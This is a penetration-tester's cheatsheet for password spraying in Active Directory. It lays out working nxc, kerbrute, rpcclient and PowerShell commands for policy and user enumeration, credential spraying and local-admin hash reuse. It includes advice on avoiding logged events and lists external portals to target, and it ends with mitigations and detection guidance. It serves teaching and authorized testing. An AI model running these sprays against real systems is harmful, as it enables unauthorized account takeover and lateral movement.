# Password Spraying Cheatsheet

## 1. Concept

- **Brute force** = many passwords against ONE user → fast lockout risk.
- **Password spray** = ONE common password against MANY users, with delays between rounds → stays under lockout thresholds.

```
Round 1: Welcome1     → bob.smith, john.doe, jane.doe
         [DELAY]
Round 2: Passw0rd      → bob.smith, john.doe, jane.doe
         [DELAY]
Round 3: Winter2026     → bob.smith, john.doe, jane.doe
```

Goal: one valid cred → foothold → credentialed enumeration (BloodHound, shares, etc.) → escalate.

---

## 2. Step 1 — Get the Password Policy (so you know how hard you can spray)

> `crackmapexec` is dead — use **netexec (nxc)**, the actively maintained fork. Syntax is nearly identical.

**Credentialed:**
```bash
nxc smb <DC_IP> -u <user> -p '<pass>' --pass-pol
```

**Null session / unauthenticated:**
```bash
nxc smb <DC_IP> -u '' -p '' --pass-pol
```

**rpcclient (null session, still reliable):**
```bash
rpcclient -U "" -N <DC_IP>
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

**`enum4linux` is unmaintained — use `enum4linux-ng`:**
```bash
enum4linux-ng -P <DC_IP> -oA output
```

**LDAP anonymous bind:**
```bash
ldapsearch -H ldap://<DC_IP> -x -b "DC=domain,DC=local" -s sub "*" | grep -i -A10 pwdHistoryLength
```

**From a Windows host (authenticated):**
```cmd
net accounts
```
```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

### ⚠️ Fine-Grained Password Policies (FGPP)
The domain-wide policy above can be overridden per-OU/group on 2008+ domains. Don't trust the default policy blindly — check for FGPP on your actual target group before committing to a spray cadence:
```powershell
Get-DomainFineGrainedPasswordPolicy
```
```bash
nxc ldap <DC_IP> -u <user> -p '<pass>' -M get-desc-users
```

### Reading the policy
| Field | What it tells you |
|---|---|
| Min password length | 7–8 = weak passwords likely viable; 10–14 = spray still works, just narrow your password list to longer common patterns |
| Lockout threshold | How many attempts you can burn per window (spray 2–3 less than this, to stay safe) |
| Lockout observation window | Reset timer for bad attempts — space rounds by this + buffer |
| Lockout duration | If you DO lock someone out, time till auto-unlock (or "not set" = needs admin to manually unlock — be extra careful) |
| Complexity enabled | `Welcome1`, `Password1`, `Summer2026!` etc. all satisfy complexity while still being garbage passwords |

**No policy obtainable at all?** One hail-mary spray, or one round every few hours. Log target accounts, DC used, password(s) tried, date/time — so you can cross-reference if anything gets flagged.

---

## 3. Step 2 — Build the Target User List

**Null session / unauthenticated — nxc pulls users + badpwdcount together (prefer this over separate enum4linux-ng run for this specific job):**
```bash
nxc smb <DC_IP> -u '' -p '' --users
nxc smb <DC_IP> -u '' -p '' --users | grep -v "badpwdcount: [1-9]"   # drop accounts already close to lockout
```

**LDAP anonymous — skip `windapsearch` (unmaintained, Python2-era). Use `ldapsearch` or `bloodhound-python`:**
```bash
ldapsearch -H ldap://<DC_IP> -x -b "DC=domain,DC=local" "(&(objectclass=user))" sAMAccountName | grep sAMAccountName
```

**Kerbrute — best option when you have zero internal access at all.** Uses Kerberos pre-auth, so enumeration doesn't generate Event ID 4625 and won't lock accounts out:
```bash
kerbrute userenum -d domain.local --dc <DC_IP> /opt/jsmith.txt -o valid_users.txt
```
- Only fires Event ID 4768 (TGT requested) — and only logged if Kerberos auditing is explicitly enabled via GPO, which most orgs skip.
- Typical hit rate off a generic list like `jsmith.txt` (flast format) is ~40–60% of real accounts.

**Credentialed (you already have one set of creds):**
```bash
nxc smb <DC_IP> -u <user> -p '<pass>' --users
```

**Zero internal access, external OSINT route:**
```bash
python3 linkedin2username.py -c "Company Name" -f "first.last"
```
If that's not productive, check document metadata from public PDFs/Office files on the target's site — this is how internal naming conventions (even weird GUID-style usernames) sometimes leak:
```bash
exiftool *.pdf
```
If you know the exact username format (e.g. 4-char `A-Z0-9` GUID style), you can brute-generate the full possible-username space and feed it to Kerbrute instead of guessing:
```bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x; done > possible_users.txt
kerbrute userenum -d domain.local --dc <DC_IP> possible_users.txt -o valid_users.txt
```
This turns a 40–60% hit list into potentially 100% of real accounts — much stronger spray coverage.

---

## 4. Step 3 — Spray (from Linux)

**Kerbrute (preferred for stealth — pre-auth spray, no Event 4625; still counts toward lockout, so timing discipline still applies):**
```bash
kerbrute passwordspray -d domain.local --dc <DC_IP> valid_users.txt 'Welcome1'
```

**netexec (nxc) — standard SMB spray:**
```bash
nxc smb <DC_IP> -u valid_users.txt -p 'Welcome1' --continue-on-success
```
`--continue-on-success` keeps the run going past the first hit instead of stopping, so you collect every valid pair in one pass instead of re-running per account.

**rpcclient one-liner (works even when SMB signing/other restrictions get in nxc's way — good fallback):**
```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC_IP> | grep Authority; done
```
A successful login shows `Authority Name:` in the response — that's your filter.

**Validate a hit quickly:**
```bash
nxc smb <DC_IP> -u <user> -p '<pass>'
```

**Common first-round passwords to try** (complexity-compliant, still weak): `Welcome1`, `Password1`, `Summer2026!`, `<CompanyName>123!`, `ChangeMe1` — always tailor to season/year and company name if known (much higher hit rate than generic lists).

---

## 5. Spray from Windows (on a domain-joined foothold)

**DomainPasswordSpray.ps1** — if you're authenticated to the domain, it auto-builds the user list from AD, pulls the password policy (FGPP-aware), and automatically drops any account sitting within one attempt of lockout. This is the safest option when you're already on a domain-joined box:
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
If you're on a Windows host but NOT authenticated to the domain, supply your own list with `-UserList valid_users.txt`.

Kerbrute also runs fine from Windows if you'd rather keep one tool across both platforms.

---

## 6. Local Admin Password Reuse (Lateral Spray)

Not just domain accounts — **local administrator password reuse across hosts** is extremely common (gold-image deployments). Worth checking on every engagement even if it's not your main path.

**Spray a known local admin password/hash across a subnet — `--local-auth` is mandatory here:**
```bash
nxc smb --local-auth 172.16.5.0/23 -u administrator -H <NTHASH> | grep +
```
`--local-auth` makes nxc attempt only ONE login per host using local SAM auth (not domain auth) — this removes lockout risk entirely. **Never omit this flag when spraying a local admin hash across a range**, or you risk a domain-wide lockout instead of a harmless local check.

**Other reuse patterns worth testing manually:**
- Desktop admin password `$desktop%@admin123` → try `$server%@admin123` on servers
- Non-standard local admin `bsmith` → check if the password matches domain user `bsmith`
- Domain user `ajones`'s password → try it on `ajones_adm` if an admin-tier account exists
- Cross-domain trusts → a cred valid in Domain A may be valid for a similarly-named user in Domain B

Prioritize spraying local admin hashes against high-value hosts (SQL servers, Exchange) — more likely to have privileged sessions/cached creds sitting in memory once you land.

**Noisy technique — not a stealth play.** Still worth flagging in every report even when it's not your path to domain compromise; remediation is **LAPS** (Local Administrator Password Solution — free from Microsoft, rotates a unique local admin password per host).

---

## 7. Lockout Math — Don't Be the Pentester Who Locks Out Everyone

**Formula:** (lockout threshold − 1) attempts per observation window, then wait the full window + a few minutes buffer before the next round.

Example: threshold = 5, window = 30 min → max 3–4 attempts per account every 31+ minutes.

Internal spray (lateral movement) follows the **same math** — getting internal access doesn't remove the lockout risk, it just might make the policy easier to obtain. Local-admin spraying with `--local-auth` is the one case where lockout math doesn't apply, since it's one attempt per host, not repeated attempts against a domain account.

---

## 8. Mitigations (for reporting)

| Technique | Why it helps |
|---|---|
| MFA | Biggest single mitigation — though some implementations still leak whether user/pass was valid even if MFA blocks the login, so flag that too |
| Restrict app access to least privilege | Fewer valid login targets per user reduces spray surface |
| Separate admin accounts | Limits blast radius if a privileged account's password is sprayed successfully |
| Network segmentation | Slows/stops lateral movement if attacker lands in one subnet |
| Password hygiene / passphrase policy + dictionary filter | Blocks `Welcome1`-style garbage from ever being set in the first place |
| LAPS | Kills local admin password reuse specifically |

---

## 9. Detection (what defenders watch for)

- Spike in **Event ID 4625** (failed logon) across many accounts in a short window — classic SMB/domain-auth spray signature
- **Event ID 4771** (Kerberos pre-auth failed) — catches LDAP/Kerberos-based spraying that skips SMB entirely (savvier attackers avoid 4625 this way)
- Many account lockouts clustering in a short period
- App/server logs showing many login attempts against valid-looking or nonexistent usernames in a tight time window

---

## 10. External Password Spraying (outside this doc's main scope, but know the targets)

Common externally-exposed services worth spraying once you have a username list and no internal foothold yet:
- Microsoft 365 / Outlook Web Access / Exchange Web Access
- Skype for Business / Lync Server
- RDS Web Access portals
- Citrix / VMware Horizon VDI portals using AD auth
- VPN portals (Citrix, SonicWall, Fortinet, OpenVPN) using AD auth
- Custom web apps with AD-backed login

Same lockout math applies — arguably more important externally since you usually can't pull the real password policy ahead of time.

---

## What changed vs. the old-school (HTB Academy module) version
- `crackmapexec` → `netexec` (CME unmaintained; nxc is the active community fork with more modules)
- `enum4linux` → `enum4linux-ng` (better parsing, structured JSON/YAML output, actually maintained)
- `windapsearch` → dropped; `ldapsearch` / `bloodhound-python` cover the same ground more reliably
- Added FGPP check — commonly overlooked and exactly what CPTS-style labs test, since the "safe" domain-wide policy can lie to you if a stricter per-group policy applies to your actual target
- Kept `rpcclient` one-liner and `DomainPasswordSpray.ps1` as-is — both still current and still the best tools for their specific jobs (no modern replacement needed)
